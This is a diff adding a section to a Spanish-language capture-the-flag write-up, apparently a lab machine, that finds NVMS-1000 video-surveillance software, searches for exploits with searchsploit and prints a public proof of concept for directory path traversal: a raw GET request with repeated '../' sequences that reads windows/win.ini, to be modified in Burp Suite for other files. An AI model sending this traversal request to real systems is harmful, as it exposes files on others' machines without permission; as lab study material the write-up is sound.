@@ -39,4 +39,32 @@ A continuación accedernos a la web que se alberga en el puerto *80*
 Viendo que la web tiene el nombre de *NVMS-1000* lo mismo a lo que se referencia *Nathan* con el cambio de contraseña que debe de realizar, buscando en internet descubrimos que es un software de gestión y monitoreo para sistemas de videovigilancia en red *(CCTV)*
 
 Buscaremos además las credenciales por defecto de este software por si son validas para acceder a el, no son validas, así que ahora investigaremos sobre vulnerabilidades que haya tenido esta herramienta.
+Podemos buscar información en internet o usando [[SEARCHSPLOIT]]
+```shell
+searchsploit nvms 1000
+```
+
+Encontrando dos vulnerabilidades de *Directory Path Traversal*, veremos el contenido del archivo de como funciona la vulnerabilidad
+```shell
+searchsploit -x hardware/webapps/47774.txt
+```
+
+```txt
+POC
+---------
+
+GET /../../../../../../../../../../../../windows/win.ini HTTP/1.1
+Host: 12.0.0.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Accept-Encoding: gzip, deflate
+Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: close
+```
+
+Vemos que podemos listar contenidos que queramos de la maquina victima retrocediendo directorios para atrás, nos abriremos el [[BURPSUITE]] para ejecutar la explotación
+
+En el *POC* nos dice que deberemos de modificar la peticion *GET* apuntando a otro directorio de la maquia windows
+
+
+
 
